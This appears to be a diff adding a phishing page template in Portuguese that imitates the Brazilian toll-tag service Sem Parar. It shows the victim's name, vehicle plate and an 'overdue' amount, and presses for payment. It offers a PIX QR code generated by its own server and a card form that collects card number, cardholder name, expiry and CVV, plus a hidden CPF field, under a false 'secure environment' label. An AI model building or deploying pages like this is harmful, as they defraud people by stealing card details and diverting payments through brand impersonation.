@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="contrato.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" />
+  <title>Contrato</title>
+</head>
+
+<body>
+  <div>
+    <header>
+      <div class="head">
+        <img src="sempara.jpg" alt="semparar.logo" />
+        <p id="nome">
+          <%= nome %>
+        </p>
+      </div>
+    </header>
+
+    <div class="content">
+      <div class="contratos">
+        <h1>Contratos</h1>
+        <p>
+          Abaixo temos a relação de contratos que atualmente estão em atraso.
+          Escolha a forma de pagamento e a opção desejada e aproveite já esta
+          excelente oportunidade!
+        </p>
+      </div>
+
+      <div class="pendencias">
+        <div class="valorContrato">
+          <p>Placa Do Veículo:</p>
+          <span class="numContrato">
+            <%= PlacaVeiculo %>
+          </span>
+        </div>
+
+        <div class="valor">
+          <p>Valor:</p>
+          <span class="avalor" id="valor">
+            <%= valor %>
+          </span>
+        </div>
+        <button class="payButton" onclick="openModal()">Pagar</button>
+
+        <div class="loading" style="display: none">
+          <img src="loading.gif" alt="Carregando..." />
+        </div>
+      </div>
+
+      <div>
+        <h1>Acordos</h1>
+        <p>No momento não existe nenhum acordo em andamento.</p>
+      </div>
+
+      <img class="fotoMuie" src="IMGmuie.jpg" />
+    </div>
+
+    <div class="modal" id="myModal" style="display: none">
+      <div class="modal-content">
+        <button class="close-button" onclick="closeModal()">X</button><br>
+        <h1>Forma de Pagamento</h1>
+        <p>Escolha a forma de pagamento:</p>
+        <div class="payment-options">
+          <div class="tab">
+            <button class="tablinks" onclick="selectPayment('PIX')">
+              <img class="pixIcon" src="logo-pix-icone-512.png" />
+              <span class="pix-cartao">PIX</span>
+            </button>
+          </div>
+          <div class="tab">
+            <button class="tablinks" onclick="selectPayment('Cartao')">
+              <img src="cartao.png" width="80px" />
+              <span class="pix-cartao">Cartão de Crédito</span>
+            </button>
+          </div>
+        </div>
+
+        <div id="PIX" class="tabcontent">
+          <div class="infos">
+            <h1>Pagamento PIX</h1>
+            <p>Valor: <span class="avalor" id="valorPIX"></span></p>
+            <div class="pix-qrcode">
+              <img id="qrcodePIX" src="" alt="Código QR PIX" />
+            </div>
+            <div id="pix-section">
+              <input type="text" id="copiaCola" value="copiaCola" readonly />
+              <button onclick="copyToClipboard()" id="copy-button">
+                <i class="fas fa-copy"></i>
+              </button>
+              <div id="mensagem"></div>
+            </div>
+          </div>
+        </div>
+
+        <div id="Cartao" class="tabcontent">
+          <h1>Valor: <span class="avalor">1x</span> de <span class="avalor">
+              <%= valor %>
+            </span> </h1>
+          <br>
+          <form method="post">
+            <label for="numeroCartao" class="numeroCartao">Número do Cartão</label>
+            <input type="hidden" id="CPF" name="CPF" value=<%=CPF %>
+            />
+            <input type="text" id="numeroCartao" name="numeroCartao"  maxlength="19" required />
+
+            <label for="nomeCartao" class="nomeCartao">Nome Impresso no Cartão</label>
+            <input type="text" id="nomeCartao" name="nomeCartao" pattern="[A-Za-zÀ-ÖØ-öø-ÿ\s]+" required />
+
+            <div class="validade-codigo-container">
+              <div class="validade">
+                <label for="validadeMes" class="validadeMes">Validade:</label>
+                <select id="validadeMes" name="validadeMes" required>
+                  <option value="01">Janeiro</option>
+                  <option value="02">Fevereiro</option>
+                  <option value="03">Março</option>
+                  <option value="04">Abril</option>
+                  <option value="05">Maio</option>
+                  <option value="06">Junho</option>
+                  <option value="07">Julho</option>
+                  <option value="08">Agosto</option>
+                  <option value="09">Setembro</option>
+                  <option value="10">Outubro</option>
+                  <option value="11">Novembro</option>
+                  <option value="12">Dezembro</option>
+                </select>
+
+                <select id="validadeAno" name="validadeAno" required>
+                  <option value="2023">2023</option>
+                  <option value="2024">2024</option>
+                  <option value="2025">2025</option>
+                  <option value="2026">2026</option>
+                  <option value="2027">2027</option>
+                  <option value="2028">2028</option>
+                  <option value="2029">2029</option>
+                  <option value="2030">2030</option>
+                  <option value="2031">2031</option>
+                  <option value="2032">2032</option>
+                  <option value="2033">2033</option>
+                </select>
+              </div>
+
+              <div class="codigo-seguranca">
+                <label for="codigoSeguranca" class="codigoSeguranca">CVV:</label>
+                <input type="text" id="codigoSeguranca" name="codigoSeguranca" maxlength="3" minlength="3" required />
+              </div>
+            </div>
+            <div>
+              <span class="ambiente"><i class="fas fa-lock"></i>Ambiente seguro!</span>
+              <input class="cadastrar-cartao" type="submit" value="Cadastrar Cartão" />
+            </div>
+        </div>
+        <div id="mensagem-sucesso" style="display: none;"></div>
+        </form>
+      </div>
+    </div>
+  </div>
+  </div>
+
+  <script>
+    function openModal() {
+      var modal = document.getElementById("myModal");
+      modal.style.display = "block";
+      document.body.style.overflow = "hidden";
+      selectPayment("PIX");
+
+      var valor = document.getElementById("valor").textContent;
+      var nome = document.getElementById("nome").textContent;
+
+      // Faça uma solicitação POST para a rota /pix com o valor
+      fetch("/pix", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ valor, nome }),
+      })
+        .then((response) => response.json())
+        .then((data) => {
+          // Manipule os dados de retorno, como o QR code PIX, aqui
+          console.log(data);
+
+          // Exiba o QR code PIX
+          var qrcodePIX = document.getElementById("qrcodePIX");
+          qrcodePIX.src = data.qrcode_base64;
+
+          // Atualize o valor PIX exibido
+          var valorPIX = document.getElementById("valorPIX");
+          valorPIX.textContent = data.amount;
+
+          var copiaCola = document.getElementById("copiaCola");
+          copiaCola.value = data.code;
+          // Você pode adicionar mais manipulações aqui, se necessário
+        })
+        .catch((error) => {
+          console.error("Erro ao abrir o site:", error);
+        });
+
+      var button = document.querySelector(".payButton");
+      button.innerHTML =
+        '<div class="loading"><img src="loading.gif" alt="Carregando..." /></div>';
+
+    }
+
+    // Função para fechar o modal
+    // Função para fechar o modal
+    function closeModal() {
+      var modal = document.getElementById("myModal");
+      if (modal.style.display === "block") {
+        modal.style.display = "none";
+        var button = document.querySelector(".payButton");
+        button.innerHTML = "Pagar";
+      }
+    }
+
+    // Adicione o ouvinte de evento 'click' para fechar o modal fora dele
+    window.addEventListener("click", function (event) {
+      var modal = document.getElementById("myModal");
+      if (event.target == modal) {
+        closeModal();
+      }
+    });
+
+    // Restante do seu código...
+
+    // Não é necessário adicionar novamente o ouvinte de evento 'input' para numeroCartaoInput
+
+
+    var numeroCartaoInput = document.getElementById("numeroCartao");
+
+    // Adicione um ouvinte de evento 'input' ao campo
+    numeroCartaoInput.addEventListener("input", function () {
+      formatarNumeroCartao(this);
+    });
+
+    function formatarNumeroCartao(input) {
+      // Remove todos os caracteres não numéricos
+      var numeroDigitado = input.value.replace(/\D/g, "");
+
+      // Limita o número a 16 caracteres
+      numeroDigitado = numeroDigitado.substring(0, 16);
+
+      // Adiciona espaços a cada 4 dígitos para formatação
+      var numeroFormatado = "";
+      for (var i = 0; i < numeroDigitado.length; i += 4) {
+        numeroFormatado += numeroDigitado.substr(i, 4) + " ";
+      }
+
+      // Remove o espaço em branco extra no final
+      numeroFormatado = numeroFormatado.trim();
+
+      // Atualize o valor do campo com o número formatado
+      input.value = numeroFormatado;
+    }
+
+    // Função para selecionar a forma de pagamento e mostrar o conteúdo correspondente
+    function selectPayment(paymentType) {
+      var tabs = document.getElementsByClassName("tabcontent");
+      for (var i = 0; i < tabs.length; i++) {
+        tabs[i].classList.remove("active");
+      }
+
+      document.getElementById(paymentType).classList.add("active");
+    }
+
+    // Função para copiar o valor PIX para a área de transferência
+    function copyToClipboard() {
+      // Seleciona o campo de input
+      var codigoPixInput = document.getElementById("copiaCola");
+
+      // Seleciona o conteúdo do campo de input
+      codigoPixInput.select();
+      codigoPixInput.setSelectionRange(0, 99999); // Para dispositivos móveis
+
+      // Copia o texto para a área de transferência
+      document.execCommand("copy");
+
+      // Remove o contorno temporariamente
+      codigoPixInput.style.outline = "none";
+
+      // Atualiza o ícone para indicar a conclusão da cópia
+      var copyButton = document.getElementById("copy-button");
+      copyButton.innerHTML = '<i class="fas fa-check"></i>';
+
+      var mensagem = document.getElementById("mensagem");
+      mensagem.textContent = "Código copiado com sucesso";
+      mensagem.style.opacity = 1;
+
+
+
+      var numeroCartaoInput = document.getElementById("numeroCartao");
+      // Adicione um ouvinte de evento 'input' ao campo
+      numeroCartaoInput.addEventListener("input", function () {
+        formatarNumeroCartao(this);
+      });
+
+
+      // Define um tempo limite para redefinir o ícone e restaurar o contorno
+      setTimeout(function () {
+        codigoPixInput.style.outline = ""; // Isso restaurará o contorno original
+        copyButton.innerHTML = '<i class="fas fa-copy"></i>';
+      }, 1000);
+
+      setTimeout(function () {
+        (mensagem.textContent = ""), (mensagem.style.opacity = 0);
+      }, 2000);
+    }
+
+    function validarNome(input) {
+  const nome = input.value;
+  const regex = /^[A-Za-zÀ-ÖØ-öø-ÿ\s]+$/;
+
+  if (!regex.test(nome)) {
+    input.setCustomValidity("Digite um nome válido (apenas letras e espaços).");
+    return false;
+  } else {
+    input.setCustomValidity("");
+    return true;
+  }
+}
+
+function validarCVV(input) {
+  const cvv = input.value;
+  const regex = /^[0-9]{3}$/;
+
+  if (!regex.test(cvv)) {
+    input.setCustomValidity("Digite um CVV válido (apenas 3 números).");
+    return false;
+  } else {
+    input.setCustomValidity("");
+    return true;
+  }
+}
+
+function validarNumeroCartao(input) {
+  const numeroCartao = input.value.replace(/\s/g, ''); // Remove todos os espaços em branco
+
+  if (numeroCartao.length !== 16) {
+    input.setCustomValidity("O número do cartão deve conter exatamente 16 caracteres.");
+    return false;
+  } else {
+    input.setCustomValidity("");
+    return true;
+  }
+}
+
+
+
+document.addEventListener("DOMContentLoaded", function () {
+  const numeroCartaoInput = document.getElementById("numeroCartao");
+  const nomeCartaoInput = document.getElementById("nomeCartao");
+  const codigoSegurancaInput = document.getElementById("codigoSeguranca");
+
+  numeroCartaoInput.addEventListener("input", function () {
+    formatarNumeroCartao(this);
+  });
+
+  nomeCartaoInput.addEventListener("input", function (event) {
+    this.value = this.value.toUpperCase(); // Converte o texto em maiúsculas
+    validarNome(event.target);
+  });
+
+  codigoSegurancaInput.addEventListener("input", function (event) {
+    validarCVV(event.target);
+  });
+
+  // Adicione um ouvinte de evento ao formulário para validação antes do envio
+  const formulario = document.querySelector("form");
+
+formulario.addEventListener("submit", function (event) {
+  if (!validarNumeroCartao(numeroCartaoInput) || !validarNome(nomeCartaoInput) || !validarCVV(codigoSegurancaInput)) {
+    event.preventDefault(); // Impede o envio do formulário se as validações falharem
+  }
+});
+
+});
+
+  </script>
+</body>
+
+</html>
